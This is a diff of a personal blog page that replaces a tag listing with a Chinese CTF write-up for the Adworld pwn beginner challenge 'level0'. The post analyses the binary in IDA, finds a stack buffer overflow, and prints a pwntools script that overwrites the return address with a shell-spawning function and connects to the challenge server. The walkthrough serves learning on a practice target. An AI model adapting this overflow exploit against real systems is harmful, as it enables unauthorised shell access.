@@ -30,29 +30,9 @@
       
         <div class="animated fadeInLeft" style="animation-delay: 0.4s">
           <p class="my-4 text-gray-600 font-light hidden lg:block">
-            我是小张，一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。
+            文章目录
           </p>
-          <div class="animated fadeInLeft social-container hidden lg:block" style="animation-delay: 0.6s">
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
+          <div class="toc-container hidden lg:block">
             
           </div>
         </div>
@@ -91,33 +71,64 @@
 </div>
 <div class="mask" onclick="closeMenu()">
 </div>
-      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4">
-        <h2 class="text-lg text-gray-700 mb-8">
-          <i class="ri-bookmark-line"></i> xss
-        </h2>
-        
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${0 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/web2-xss/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/web2-xss.jpg'">
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">攻防世界pwn新手区—level0</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-05-29 / 1 min read
         </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/web2-xss/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">CTF之一道硬核的XSS梦幻联动SQL注入的赛题—[CISCN2019 华东北赛区]Web2</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
         
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-04-28 / 6 min read</div>
-    </div>
-  </section>
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/adworld_level0.jpg" alt="">
+        
+        <div class="post-content yue">
+          <p>下载附件，简单运行一下，发现出现一个hello world然后让我们输入一个字符串，然后就退出程序……<br>
+我们拿到ida里面看一看<br>
+<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
+发现有一个vul这种函数，我们跟进去看看<br>
+<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
+发现buf这个变量向堆栈申请了80h这个长度，也就是128个字节，但是我们可以输入200个字节，这个就很危险了，可以确定偏移量为80h+8没错了，我们就是要先填充垃圾字符搞一下80h+8，然后将函数的返回地址改写成system至于为啥是80h+8，放个图，就不解释了（汇编画画堆栈图就知道啦）<br>
+<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
+然后还发现有system函数<br>
+<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
+我们一路跟进去，找找函数地址在哪<br>
+<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
+完美，拿到了函数地址，那么构造exp就很简单了：</p>
+<pre><code class="language-python">from pwn import *
 
-        <div class="pagination-container animated fadeIn">
-  
-  
-</div>
+r = remote('124.126.19.106','35956')
+
+offset = 0x80 + 8
+system_addr = 0x400596
+
+payload = offset * 'A' + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>直接拿到shell了<br>
+<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
+cat /flag 就完辣</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
+                <h3 class="post-title">
+                  攻防世界pwn新手区—hello_pwn
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
 
       </div>
     </div>
